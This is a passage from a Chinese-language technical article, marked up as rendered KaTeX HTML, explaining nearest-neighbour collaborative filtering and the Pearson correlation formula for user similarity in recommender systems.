<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>Sim</mtext><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>:</mo><mo>=</mo><mn>1</mn><mo>−</mo><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{Sim}(a, b) := 1 - d(a, b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">Sim</span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">:=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span></span></div>
<blockquote>
<p>在实际工程中，许多有效的相似性度量并不完全满足度量空间的公理（如三角不等式），这些空间被称为<strong>伪空间（Pseudo-spaces）</strong>。尽管在数学严谨性上有所欠缺，但它们在捕捉高维数据的关联特征方面具有极高的实用价值。</p>
</blockquote>
<h4 data-id="heading-5">最近邻理论</h4>
<p>最近邻（Nearest Neighbors）算法是一种基于几何思想的非参数化方法，广泛应用于分类、排名和聚类任务。给定特征向量定义的空间及空间内的一点，通过计算距离找到与其地理位置最接近的其他点。CF 将用户映射到由物品评分定义的特征空间中。通过寻找目标用户的最近邻，可以将已有数据中的用户偏好迁移至新用户，从而实现预测推理。</p>
<h4 data-id="heading-6">皮尔逊相关系数</h4>
<p>在协同过滤场景下，<strong>用户通常不在同一个特征空间内</strong>（每个人评分的物品集合不同）。皮尔逊相关系数通过<strong>提取两个用户共同评分的物品子集，计算其评分分布的相关性</strong>。该方法相比欧几里得距离的优势在于，通过减去均值 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>r</mi><mo>ˉ</mo></mover></mrow><annotation encoding="application/x-tex">\bar{r}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5678em;"/><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.1944em;"><span class="mord">ˉ</span></span></span></span></span></span></span></span></span></span></span>，它能够自动<strong>抵消用户评分尺度不一</strong>（如某些用户习惯性给高分，某些则偏严苛）带来的偏差。</p>
<p>设 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></span> 为两个用户，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">R</mi><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\mathcal{R}_{A,B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathcal">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> 为他们共同评分过的物品集合。用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 对物品 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">x</span></span></span></span></span> 的评分为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mrow><mi>A</mi><mo separator="true">,</mo><mi>x</mi></mrow></msub></mrow><annotation encoding="application/x-tex">r_{A,x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>。用户相似度 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>USim</mtext><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>B</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{USim}(A,B)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">USim</span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span></span></span></span></span> 的计算公式如下：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>USim</mtext><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>B</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><msub><mi mathvariant="script">R</mi><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi></mrow></msub></mrow></munder><mo stretchy="false">(</mo><msub><mi>r</mi><mrow><mi>A</mi><mo separator="true">,</mo><mi>x</mi></mrow></msub><mo>−</mo><msub><mover accent="true"><mi>r</mi><mo>ˉ</mo></mover><mi>A</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>r</mi><mrow><mi>B</mi><mo separator="true">,</mo><mi>x</mi></mrow></msub><mo>−</mo><msub><mover accent="true"><mi>r</mi><mo>ˉ</mo></mover><mi>B</mi></msub><mo stretchy="false">)</mo></mrow><mrow><msqrt><mrow><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><msub><mi mathvariant="script">R</mi><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi></mrow></msub></mrow></munder><mo stretchy="false">(</mo><msub><mi>r</mi><mrow><mi>A</mi><mo separator="true">,</mo><mi>x</mi></mrow></msub><mo>−</mo><msub><mover accent="true"><mi>r</mi><mo>ˉ</mo></mover><mi>A</mi></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></msqrt><msqrt><mrow><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><msub><mi mathvariant="script">R</mi><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi></mrow></msub></mrow></munder><mo stretchy="false">(</mo><msub><mi>r</mi><mrow><mi>B</mi><mo separator="true">,</mo><mi>x</mi></mrow></msub><mo>−</mo><msub><mover accent="true"><mi>r</mi><mo>ˉ</mo></mover><mi>B</mi></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></msqrt></mrow></mfrac></mrow><annotation encoding="application/x-tex">\text{USim}(A, B) = \frac{\sum_{x \in \mathcal{R}_{A,B}} (r_{A,x} - \bar{r}_A)(r_{B,x} - \bar{r}_B)}{\sqrt{\sum_{x \in \mathcal{R}_{A,B}} (r_{A,x} - \bar{r}_A)^2} \sqrt{\sum_{x \in \mathcal{R}_{A,B}} (r_{B,x} - \bar{r}_B)^2}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">USim</span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.3672em;vertical-align:-1.73em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6372em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.1114em;"/><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1114em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"/><span class="mord" style="padding-left:1em;"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1786em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathcal mtight">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2822em;"><span/></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4972em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.1944em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.0714em;"><span class="pstrut" style="height:3.8em;"/><span class="hide-tail" style="min-width:1.02em;height:1.88em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.88em" viewbox="0 0 400000 1944" preserveaspectratio="xMinYMin slice"><path d="M983 90&#10;l0 -0&#10;c4,-6.7,10,-10,18,-10 H400000v40&#10;H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7&#10;s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744&#10;c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30&#10;c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722&#10;c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5&#10;c53.7,-170.3,84.5,-266.8,92.5,-289.5z&#10;M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7286em;"><span/></span></span></span></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1114em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"/><span class="mord" style="padding-left:1em;"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1786em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathcal mtight">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2822em;"><span/></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4972em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.1944em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.0714em;"><span class="pstrut" style="height:3.8em;"/><span class="hide-tail" style="min-width:1.02em;height:1.88em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.88em" viewbox="0 0 400000 1944" preserveaspectratio="xMinYMin slice"><path d="M983 90&#10;l0 -0&#10;c4,-6.7,10,-10,18,-10 H400000v40&#10;H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7&#10;s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744&#10;c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30&#10;c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722&#10;c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5&#10;c53.7,-170.3,84.5,-266.8,92.5,-289.5z&#10;M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7286em;"><span/></span></span></span></span></span></span><span style="top:-3.3414em;"><span class="pstrut" style="height:3.1114em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.9986em;"><span class="pstrut" style="height:3.1114em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1786em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathcal mtight">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2822em;"><span/></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4972em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.1944em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.1944em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.73em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p><strong>符号定义：</strong></p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">R</mi><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\mathcal{R}_{A,B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathcal">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>：用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 和用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></span> 共同评价过的物品交集。</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mrow><mi>A</mi><mo separator="true">,</mo><mi>x</mi></mrow></msub></mrow><annotation encoding="application/x-tex">r_{A,x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>：用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 对物品 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">x</span></span></span></span></span> 的原始评分。</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mover accent="true"><mi>r</mi><mo>ˉ</mo></mover><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">\bar{r}_A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7178em;vertical-align:-0.15em;"/><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.1944em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>：用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 在共同评分集合中的平均评分。</li>
